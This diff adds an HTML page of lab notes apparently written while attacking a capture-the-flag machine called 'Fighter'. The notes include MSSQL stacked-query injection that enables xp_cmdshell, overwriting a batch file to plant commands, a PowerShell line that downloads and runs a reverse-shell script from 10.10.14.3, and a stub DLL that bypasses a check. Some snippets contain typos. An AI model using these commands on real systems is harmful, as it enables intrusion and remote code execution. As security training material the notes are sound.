@@ -1,0 +1,65 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Fighter - MSSQL Evasion Truncate Append DLL Create</title>
+</head><body>WFUZZ can bruteforce subdomains that you can't resolve by fuzzing the Header (-H)<br/>
+wfuzz -w subdomains.txt -u streetfighterclub.htb -H "Host: FUZZ.streetfighterclub.htb"<br/>
+<br/>
+SQL injection can happen on any parameter, including dropdown menus and checkbox values. Union Select columns and find whichever value is returning data and that will be where you can inject arbitrary queries AND SEE your data. <br/>
+If you can't see any column values returning, you'll have to inject blind. <br/>
+<br/>
+MSSQL is 'generally' vulnerable to what is known as 'stacked queries'<br/>
+netsparker.com/blog/web-security/sql-injectinon-cheat-sheet<br/>
+(vulnerable in asp, asp.net, php. just not java)<br/>
+<br/>
+Stacked queries basically means we don't have to UNION SELECT. You can just put in any statement and it will execute the original, and then execute your query. <br/>
+3; EXEC sp_configure 'show advanced options', 1; exec xp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -<br/>
+<br/>
+Neat trick: create a table to store xp_cmdshell output<br/>
+CREATE TABLE ippsec (ID int IDENTITY(1,1) PRIMARY KEY, output varchar(1024)); <br/>
+INSERT INTO ippsec (output) EXEC xp_cmdshell "whoami";<br/>
+<br/>
+And then select it<br/>
+3; UNION SELECT 1,2,3,4,(SELECT output FROM ippsec WHERE ID = 1),6-- -<br/>
+<br/>
+Drop it when done;<br/>
+DROP TABLE ippsec<br/>
+<br/>
+<br/>
+Powershell: access is denied<br/>
+If the machine is 64 bit, Try the other version in syswow64.<br/>
+<br/>
+<br/>
+Truncating files with append permissions to erase them<br/>
+PS&gt; [System.IO.File]::Open('C:\users\decoder\clean.bat', [System.IO.FileMode]::Truncate)<br/>
+*warning the above file may not close the file so a new shell will be needed here<br/>
+But truncating it with the command above erases the file's contents!<br/>
+Now append whatever commands you want<br/>
+<br/>
+Another option is to use cmd copy<br/>
+cmd /c "copy /y NUL Clean.bat"<br/>
+<br/>
+#Escape with double single quotes by http<br/>
+echo 'powershell -nop -c "IEX(new-Object Net.WebClient).downloadString(''http://10.10.14.3/rev-445.ps1')"<br/>
+<br/>
+certutil can do all sorts of amazing things...like encode files<br/>
+certutil -encode clean.bat &lt;output/file/&gt;<br/>
+<br/>
+cmd /c "type launcher" &gt;&gt; file.bat<br/>
+<br/>
+Create new DLL<br/>
+Visual Studio: New &gt; Win32 Console Application &gt; <br/>
+Application settings: Application type: DLL<br/>
+<br/>
+#include "stdafx.h"<br/>
+<br/>
+exterm "C" {<br/>
+&nbsp; &nbsp; __declspec(dllexport) int check();&#09;#this is what the root.exe is calling<br/>
+}<br/>
+<br/>
+int __cdecl check() #we just need it to return 1<br/>
+{<br/>
+&nbsp; &nbsp; return 1;<br/>
+}<br/>
+</body></html>
